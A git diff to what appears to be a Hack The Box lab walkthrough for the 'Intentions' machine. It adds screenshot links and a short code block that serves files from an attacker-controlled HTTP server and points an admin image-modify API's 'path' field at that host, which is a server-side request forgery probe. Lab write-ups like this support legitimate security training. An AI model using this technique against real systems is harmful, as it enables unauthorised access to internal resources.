@@ -90,6 +90,15 @@ http://intentions.htb/api/v2/admin/image/modify
 
 ![image](https://github.com/regarmulia/HTB/assets/33616880/788c8136-6a8f-4715-95b9-e558c5b1a819)
 
-![Uploading image.png…]()
+![image](https://github.com/regarmulia/HTB/assets/33616880/f2feecb3-45da-43b6-b7b7-2d9585cba47f)
 
 
+```
+python3 -m http.server 80
+http://intentions.htb/api/v2/admin/image/modify
+"path":"http://10.10.14.6/test”
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/7446d685-b13d-437d-b177-a34ce4d105a0)
+
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/36a9081f-c32a-400f-b322-618f52ac3216)
